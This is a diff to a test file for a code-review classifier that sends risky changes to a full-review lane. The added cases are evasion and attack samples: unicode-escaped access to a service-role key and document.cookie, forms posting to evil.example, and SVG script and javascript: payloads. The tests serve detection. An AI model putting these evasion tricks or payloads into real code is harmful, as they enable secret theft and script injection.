@@ -7,8 +7,8 @@ import { classifyChanges, collectChanges, classifyRange, resolveSpecifier, TOOLI
 
 // Repository files visible at the target for import resolution.
 const REPO: Record<string, string> = {
-  'lib/utils.ts': "export const cn = (...a: string[]) => a.join(' ');",
-  'components/ui/Badge.tsx': "import { cn } from '@/lib/utils';\nexport const Badge = () => <span className={cn('a')} />;",
+  'components/ui/cn.ts': "export const cn = (...a: string[]) => a.join(' ');",
+  'components/ui/Badge.tsx': "import { cn } from './cn';\nexport const Badge = () => <span className={cn('a')} />;",
   'components/ui/Fetcher.tsx': "export async function load() { return (await fetch('/api/x')).json(); }",
   'components/ui/Inner.tsx': "import { load } from './Fetcher';\nexport const Inner = () => null;",
 };
@@ -90,6 +90,12 @@ describe('Release V3 lane classifier: content (whole before and after versions)'
     [`import { x } //${'\t'.repeat(520)}export type { A }\nfrom '@/lib/bot/x';`, 'imports @/lib/bot/x'],
     [`import { x } /*${' '.repeat(3000)}*/\nfrom '@/lib/bot/x';`, 'imports @/lib/bot/x'],
     ["self[atob('ZmV0Y2g=')]('/x');", 'computed global access'],
+    // Review 2: identifier escapes and external form posts.
+    ['const k = proc\\u0065ss.env.SUPABASE_SERVICE_ROLE_KEY;', 'escape sequence'],
+    ['const r = f\\u0065tch("/x");', 'escape sequence'],
+    ['const c = docum\\u{65}nt.cookie;', 'escape sequence'],
+    ['<form action="https://evil.example/collect"><input name="e" /></form>', 'form posting to another site'],
+    ['<button formAction={"//evil.example"}>Go</button>', 'form posting to another site'],
     ["globalThis['fe' + 'tch']('/x');", 'environment or global access'],
   ])('an allowlisted file containing %j is full', (text, reason) => {
     const r = lane(change(page, text, 'A'));
@@ -116,6 +122,11 @@ describe('Release V3 lane classifier: content (whole before and after versions)'
     expect(lane(change('public/a.svg', '<svg onload="x()"></svg>', 'A')).lane).toBe('full');
     expect(lane(change('public/c.svg', '<svg><foreignObject/></svg>', 'A')).lane).toBe('full');
     expect(lane(change('public/b.svg', '<svg><path d="M0"/></svg>', 'A')).lane).toBe('standard');
+    // Review 2: namespaced script, entity-encoded javascript:, external links.
+    expect(lane(change('public/d.svg', '<svg><x:script xmlns:x="http://www.w3.org/2000/svg">alert(1)</x:script></svg>', 'A')).lane).toBe('full');
+    expect(lane(change('public/e.svg', '<svg><a href="jav&#97;script:alert(1)"><path/></a></svg>', 'A')).lane).toBe('full');
+    expect(lane(change('public/f.svg', '<svg><image xlink:href="https://evil.example/x.png"/></svg>', 'A')).lane).toBe('full');
+    expect(lane(change('public/g.svg', '<svg><use href="#icon"/></svg>', 'A')).lane).toBe('standard');
   });
   it('deleting a display-only file stays standard; deleting a data-access file is full', () => {
     expect(lane(change('components/ui/Old.tsx', 'export const Old = 1;', 'D')).lane).toBe('standard');
